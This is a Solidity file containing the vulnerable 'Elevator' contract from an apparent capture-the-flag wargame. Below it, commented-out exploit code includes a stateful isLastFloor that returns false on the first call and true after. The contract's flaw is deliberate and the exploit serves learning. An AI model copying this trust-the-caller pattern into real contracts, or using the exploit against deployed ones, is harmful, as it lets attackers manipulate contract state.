// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
//we need building.isLastFloor(_floor) to be false for the first time and remaining times true


// uint256 timesCalled;

// function attack() external payable {
//     challenge.goTo(10);
// }

// function isLastFloor(uint256 /* floor */) external returns (bool) {
//     timesCalled++;
//     if (timesCalled > 1) return true;
//     else return false;
// }